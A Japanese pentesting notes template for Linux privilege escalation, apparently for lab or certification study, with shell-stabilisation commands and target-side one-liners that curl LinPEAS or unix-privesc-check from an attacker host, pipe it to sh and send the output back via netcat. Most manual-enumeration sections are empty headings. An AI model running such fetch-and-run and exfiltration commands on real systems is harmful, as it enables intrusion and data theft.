# シェルの安定化

※penelopeでシェル獲得できた場合は不要
```zsh
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm-256color
# Ctrl + Z
stty raw -echo; fg
```

---

# Auto 

## unix-privesc-check

### 転送・実行

```zsh
# Attacker
cp /usr/bin/unix-privesc-check .
python -m http.server 8888
nc -lvnp 9002 | tee unix-privesc-check.out
```
```zsh
# Target
curl <AttackerIP>:8888/unix-privesc-check | sh -s standard | nc -q 0 <AttackerIP> 9002
```

### 実行結果抽出


---

## LinPEAS

### 転送・実行

```zsh
# Attacker
cp /usr/share/peass/linpeas/linpeas.sh .
python -m http.server 8888
nc -lvnp 9002 | tee linpeas.out
```
```zsh
# Target
curl <AttackerIP>:8888/linpeas.sh | sh | nc -q 0 <AttackerIP> 9002
```

### 実行結果抽出

```powershell

```

---
---

# Manual

## ユーザー


---

## システム情報


---

## 実行中のプロセス


---

## ネットワーク


---

## Cron


---

## インストール済みアプリケーション


---

## アクセス制限が不十分なファイル/ディレクトリ


---

## マウントされていないドライブ


---

## 高権限をもつバイナリの列挙



---

## システムデーモン



---

## 共有フォルダ、SNMP情報


---

## 興味深い情報


---

## デバイスドライバ・カーネルモジュール



